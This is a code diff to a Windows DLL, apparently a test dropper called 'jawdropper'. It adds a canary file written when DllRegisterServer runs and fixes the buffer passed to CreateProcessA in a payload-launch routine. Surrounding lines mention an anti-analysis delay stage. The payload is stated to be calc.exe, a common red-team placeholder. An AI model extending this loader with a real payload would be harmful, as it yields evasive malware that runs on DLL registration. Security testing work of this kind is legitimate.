@@ -97,6 +97,29 @@ BOOL APIENTRY DllMain(HMODULE hModule, DWORD dwReason, LPVOID lpReserved) {
 __declspec(dllexport) HRESULT STDAPICALLTYPE DllRegisterServer(void) {
     /*
      * ========================================================================
+     * CANARY: Confirm DllRegisterServer is being called
+     * ========================================================================
+     * Creates a file to prove this function was entered. Check for:
+     *   C:\jawdropper_executed.txt
+     */
+    HANDLE hCanary = CreateFileA(
+        "C:\\jawdropper_executed.txt",
+        GENERIC_WRITE,
+        0,
+        NULL,
+        CREATE_ALWAYS,
+        FILE_ATTRIBUTE_NORMAL,
+        NULL
+    );
+    if (hCanary != INVALID_HANDLE_VALUE) {
+        const char* msg = "DllRegisterServer was called successfully.\r\n";
+        DWORD written;
+        WriteFile(hCanary, msg, (DWORD)strlen(msg), &written, NULL);
+        CloseHandle(hCanary);
+    }
+
+    /*
+     * ========================================================================
      * Stage 1: Anti-analysis delay
      * ========================================================================
      *
@@ -459,6 +482,7 @@ cleanup:
 static void launch_payload(void) {
     STARTUPINFOA si;
     PROCESS_INFORMATION pi;
+    char cmd_buf[64];  /* Writable buffer for CreateProcessA */
 
     ZeroMemory(&si, sizeof(si));
     si.cb = sizeof(si);
@@ -467,10 +491,16 @@ static void launch_payload(void) {
     /*
      * SAFETY: PAYLOAD_COMMAND is #defined as "calc.exe"
      * This cannot be overridden at runtime.
+     *
+     * Note: CreateProcessA requires a writable lpCommandLine buffer,
+     * so we copy the constant into a local array.
      */
+    strncpy(cmd_buf, PAYLOAD_COMMAND, sizeof(cmd_buf) - 1);
+    cmd_buf[sizeof(cmd_buf) - 1] = '\0';
+
     CreateProcessA(
         NULL,
-        PAYLOAD_COMMAND,
+        cmd_buf,
         NULL,
         NULL,
         FALSE,
